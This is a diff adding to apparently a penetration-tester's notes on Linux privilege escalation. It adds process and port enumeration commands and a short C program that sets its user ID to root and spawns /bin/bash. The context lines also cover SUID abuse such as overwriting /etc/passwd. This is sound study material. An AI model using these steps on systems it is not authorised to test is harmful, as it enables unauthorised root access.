@@ -26,6 +26,9 @@ ps aux | grep root --color=auto
 ps -ef --forest | grep root --color=auto
 ps aux | grep pass --color=auto
 ps -ef --forest | grep pass --color=auto
+
+ps auxww | grep cloudhosting
+netstat -tnlp | grep 1063
 ```
 
 ### Available Network Interfaces, Routes, and Open Ports
@@ -51,6 +54,9 @@ ss -lntp
 netstat -antup
 sudo netstat -ltnp
 netstat -a -o | grep "9090"
+sudo netstat -tulnp | grep -E ':3389|:3350'
+# Check specific process command and details
+ps -fp PID
 ```
 
 If a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system.
@@ -169,6 +175,16 @@ ll $(find / -perm -u=s -type f 2>/dev/null ) && ll $(find / -perm -g=s -type f 2
 
 In this case, the command found several SUID binaries. Exploitation of SUID binaries will vary based on several factors. For example, if /bin/cp (the copy command) were SUID, we could copy and overwrite sensitive files such as /etc/passwd.
 
+Set owner user ID.
+
+```bash
+int main(void){
+setresuid(0, 0, 0);
+system("/bin/bash");
+}
+# Compile
+gcc suid.c -o suid
+```
 Here's a great resource to [reference] (https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 
 ### Automating Enumeration
